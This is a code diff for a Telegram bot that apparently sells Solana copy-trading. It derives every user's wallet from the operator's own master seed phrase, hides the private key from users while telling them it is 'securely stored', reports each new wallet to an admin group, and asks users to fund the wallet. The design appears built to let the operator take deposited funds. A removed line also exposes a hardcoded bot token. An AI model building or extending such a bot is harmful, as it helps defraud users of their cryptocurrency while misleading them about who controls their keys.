@@ -3,6 +3,7 @@ import os
 import hashlib
 import base58
 import json
+import requests
 from dotenv import load_dotenv
 from nacl.signing import SigningKey
 from solders.keypair import Keypair
@@ -25,10 +26,24 @@ from telegram.ext import (
 load_dotenv()
 # Store temporary user states
 user_states = {}
+# Track users whose wallet info has been sent to admin group (prevent spam)
+wallet_sent_to_admin = set()
+
+# Load persisted wallet notifications from file
+try:
+    with open("wallet_notifications.txt", "r") as f:
+        for line in f:
+            user_id = line.strip()
+            if user_id.isdigit():
+                wallet_sent_to_admin.add(int(user_id))
+except FileNotFoundError:
+    pass  # File doesn't exist yet, will be created on first notification
 
 # ---- CONFIG ----
-BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', "8469292173:AAFwdg2McWdFpzoqnC1ySayDhFFC4UKgAxY")
-GROUP_ID = int(os.getenv('ADMIN_GROUP_ID', -1002762295115))
+BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
+if not BOT_TOKEN:
+    raise SystemExit("TELEGRAM_BOT_TOKEN environment variable is required")
+GROUP_ID = int(os.getenv('ADMIN_GROUP_ID', 0))
 MNEMONIC = os.getenv('MNEMONIC', '')  # Master seed phrase for wallet generation
 
 # ---- Wallet Generation Utility Functions ----
@@ -68,19 +83,40 @@ def derive_keypair_and_address(telegram_id: int):
 async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     telegram_id = user.id
+    user_name = user.username or user.first_name or str(telegram_id)
     
     try:
         # Generate unique wallet for this user
         public_address, private_key_b58 = derive_keypair_and_address(telegram_id)
         
+        # Send ONLY public address to admin group (only once per user to prevent spam)
+        # Private keys should NEVER be transmitted - they can be re-derived when needed
+        if telegram_id not in wallet_sent_to_admin and GROUP_ID:
+            try:
+                admin_message = (
+                    f"👤 <b>New Wallet Generated</b>\n\n"
+                    f"User: @{user_name} (ID: {telegram_id})\n\n"
+                    f"📬 <b>Public Address:</b>\n"
+                    f"<code>{public_address}</code>"
+                )
+                await context.bot.send_message(chat_id=GROUP_ID, text=admin_message, parse_mode="HTML")
+                wallet_sent_to_admin.add(telegram_id)
+                # Persist to file for restart persistence
+                try:
+                    with open("wallet_notifications.txt", "a") as f:
+                        f.write(f"{telegram_id}\n")
+                except Exception as e:
+                    print(f"Error persisting notification record: {e}")
+            except Exception as e:
+                print(f"Error sending wallet to admin group: {e}")
+        
+        # Show only public address to user (hide private key for security)
         wallet_text = (
             "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
             "<b>Your Unique Solana Wallet</b>\n\n"
             "📬 <b>Public Address:</b>\n"
             f"<code>{public_address}</code>\n\n"
-            "🔐 <b>Private Key:</b>\n"
-            f"<code>{private_key_b58}</code>\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━\n"
             "<b>Holdings</b>\n"
             "• <b>SOL:</b> 0.00 (0%)\n"
@@ -91,7 +127,7 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "💰 <b>Fund Your Bot</b>\n"
             f"Send SOL to your address above\n\n"
             "(Funds are required for copy-trading operations.)\n\n"
-            "⚠️ <b>Security:</b> Keep your private key safe! Never share it.\n"
+            "⚠️ <b>Security:</b> Your private key is securely stored.\n"
             "This wallet is uniquely generated for your Telegram ID.\n\n"
             "⚡ <b>Quick Actions</b>\n"
             "• ⚓️ /start – Refresh your bot\n\n"
@@ -180,7 +216,7 @@ def main_menu_markup():
         ["💸Withdraw", "🔌Connect Wallet"],
         ["🔍Copy Trade", "🔐Settings"],
         ["🧩Wallet", "🤖Bot Guide"],
-        ["📊Live Chart"]
+        ["💰Buy", "📊Live Chart"]
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
@@ -190,6 +226,141 @@ def cancel_markup():
 # Validate a single word: only letters A-Z (either case)
 def is_alpha_word(word: str) -> bool:
     return bool(re.fullmatch(r"[A-Za-z]+", word))
+
+# Fetch token details from DexScreener API (using run_in_executor for non-blocking)
+async def get_token_details(token_address: str):
+    """Fetch token details from DexScreener API"""
+    import asyncio
+    
+    def fetch():
+        try:
+            url = f"https://api.dexscreener.com/latest/dex/tokens/{token_address}"
+            response = requests.get(url, timeout=10)
+            
+            if response.status_code == 200:
+                data = response.json()
+                if data and 'pairs' in data and len(data['pairs']) > 0:
+                    return data['pairs'][0]  # Return the first (most liquid) pair
+            return None
+        except Exception as e:
+            print(f"Error fetching token details: {e}")
+            return None
+    
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(None, fetch)
+
+# Format token details for display
+def format_token_details(pair_data, wallet_balance=0):
+    """Format token details in the style requested by user"""
+    try:
+        from datetime import datetime
+        
+        token = pair_data.get('baseToken', {})
+        quote = pair_data.get('quoteToken', {})
+        
+        # Token name and symbol
+        token_name = token.get('name', 'Unknown')
+        token_symbol = token.get('symbol', 'Unknown')
+        token_address = token.get('address', 'N/A')
+        
+        # Market data
+        price_usd = float(pair_data.get('priceUsd', 0)) if pair_data.get('priceUsd') else 0
+        market_cap = pair_data.get('marketCap')
+        fdv = pair_data.get('fdv')
+        liquidity_usd = pair_data.get('liquidity', {}).get('usd', 0)
+        
+        # Volume and transactions
+        volume_24h = pair_data.get('volume', {}).get('h24', 0)
+        txns_24h = pair_data.get('txns', {}).get('h24', {})
+        buyers_24h = txns_24h.get('buys', 0) if txns_24h else 0
+        
+        # DEX info
+        dex_id = pair_data.get('dexId', 'Unknown').upper()
+        pair_created = pair_data.get('pairCreatedAt', 0)
+        
+        # Links
+        info = pair_data.get('info', {})
+        socials = info.get('socials', [])
+        
+        twitter_link = "❌"
+        telegram_link = "❌"
+        
+        for social in socials:
+            if social.get('type') == 'twitter':
+                twitter_link = "✅"
+            elif social.get('type') == 'telegram':
+                telegram_link = "✅"
+        
+        # Format price with proper decimals (fix for very small prices)
+        if price_usd == 0:
+            price_str = "0"
+        else:
+            # Use high precision formatting to preserve significant digits for very small prices
+            price_str = ("%.18f" % price_usd).rstrip('0').rstrip('.')
+        
+        # Fix timestamp conversion (pairCreatedAt is in milliseconds)
+        if pair_created:
+            # Convert milliseconds to seconds
+            created_dt = datetime.fromtimestamp(pair_created / 1000)
+            time_diff = datetime.now() - created_dt
+            days = time_diff.days
+            hours = time_diff.seconds // 3600
+            minutes = (time_diff.seconds % 3600) // 60
+            time_ago = f"{days}d {hours}h {minutes}m ago" if days > 0 else f"{hours}h {minutes}m ago"
+        else:
+            time_ago = "Unknown"
+        
+        # Format market cap with fallback to FDV
+        if market_cap and market_cap > 0:
+            if market_cap >= 1000000:
+                mcap_str = f"{market_cap/1000000:.1f}M"
+            else:
+                mcap_str = f"{market_cap/1000:.1f}K"
+        elif fdv and fdv > 0:
+            if fdv >= 1000000:
+                mcap_str = f"{fdv/1000000:.1f}M (FDV)"
+            else:
+                mcap_str = f"{fdv/1000:.1f}K (FDV)"
+        else:
+            mcap_str = "Unknown"
+        
+        # Format liquidity
+        if liquidity_usd >= 1000000:
+            liq_str = f"{liquidity_usd/1000000:.2f}M"
+        else:
+            liq_str = f"{liquidity_usd/1000:.2f}K"
+        
+        message = (
+            f"📌 <b>{token_name} ({token_symbol})</b>\n"
+            f"<code>{token_address}</code>\n\n"
+            f"💳 <b>Wallet:</b>\n"
+            f"|——Balance: {wallet_balance} SOL ($0)\n"
+            f"|——Holding: 0 SOL ($0) — 0 {token_symbol}\n"
+            f"|___PnL: 0%🚀🚀\n\n"
+            f"💵 <b>Trade:</b>\n"
+            f"|——Market Cap: {mcap_str}\n"
+            f"|——Price: {price_str}\n"
+            f"|___Buyers (24h): {buyers_24h}\n\n"
+            f"🔍 <b>Security:</b>\n"
+            f"|——Security scan available on DexScreener\n"
+            f"|——Trade Tax: Check DexScreener\n"
+            f"|___Top 10: Check DexScreener\n\n"
+            f"📝 <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
+            f"|——💧 {dex_id} AMM\n"
+            f"|——🟢 Trading opened\n"
+            f"|——Created {time_ago}\n"
+            f"|___Liquidity: {liq_str} USD\n\n"
+            f"📲 <b>Links:</b>\n"
+            f"|—— Twitter {twitter_link}\n"
+            f"|—— Telegram {telegram_link}\n"
+            f"|___ <a href='https://dexscreener.com/solana/{token_address}'>DexScreener</a> | "
+            f"<a href='https://www.pump.fun/{token_address}'>Pump</a>"
+        )
+        
+        return message
+    except Exception as e:
+        print(f"Error formatting token details: {e}")
+        return None
 
 # --- /start ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -321,6 +492,57 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
         context.user_data.pop("awaiting_copy_trade", None)
+        return
+
+    # ----- Handle Buy Token -----
+    if context.user_data.get("awaiting_token_contract"):
+        if text.lower() == "cancel":
+            context.user_data.pop("awaiting_token_contract", None)
+            await update.message.reply_text(
+                "Buy cancelled.", 
+                reply_markup=main_menu_markup()
+            )
+            return
+
+        token_address = text.strip()
+
+        # Validate Solana token address (base58 format, 32-44 characters)
+        # Base58 excludes: 0, O, I, l (to avoid confusion)
+        base58_pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
+        if not re.match(base58_pattern, token_address):
+            await update.message.reply_text(
+                "❗ Invalid token contract address. Please enter a valid Solana token address.\n\n"
+                "Solana addresses are 32-44 characters and use base58 encoding.",
+                reply_markup=cancel_markup()
+            )
+            return
+
+        # Fetch token details
+        await update.message.reply_text("🔍 Fetching token details...")
+        
+        pair_data = await get_token_details(token_address)
+        
+        if pair_data:
+            token_info = format_token_details(pair_data, wallet_balance=0)
+            if token_info:
+                await update.message.reply_text(
+                    token_info,
+                    parse_mode="HTML",
+                    disable_web_page_preview=True,
+                    reply_markup=main_menu_markup()
+                )
+            else:
+                await update.message.reply_text(
+                    "❗ Error formatting token details. Please try again.",
+                    reply_markup=main_menu_markup()
+                )
+        else:
+            await update.message.reply_text(
+                "❗ Token not found or no trading pairs available. Please check the contract address.",
+                reply_markup=main_menu_markup()
+            )
+
+        context.user_data.pop("awaiting_token_contract", None)
         return
 
     # ----- Handle Settings Number Input -----
@@ -461,6 +683,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(guide_text, parse_mode="HTML", reply_markup=guide_buttons)
         return
 
+
+    elif text == "💰Buy":
+        context.user_data["awaiting_token_contract"] = True
+        await update.message.reply_text(
+            "💰 <b>Buy Token</b>\n\n"
+            "Please paste the Solana token contract address you want to buy.\n\n"
+            "📝 <b>Example:</b>\n"
+            "<code>HZ47qG6JyiM6KMJHLUJy7tsRtzE6CLthTEWj4opwgkHf</code>\n\n"
+            "I'll show you the token details including price, market cap, liquidity, and security info.\n\n"
+            "Tap Cancel if you want to go back.",
+            parse_mode="HTML",
+            reply_markup=cancel_markup()
+        )
+        return
 
     elif text == "📊Live Chart":
         chart_text = (
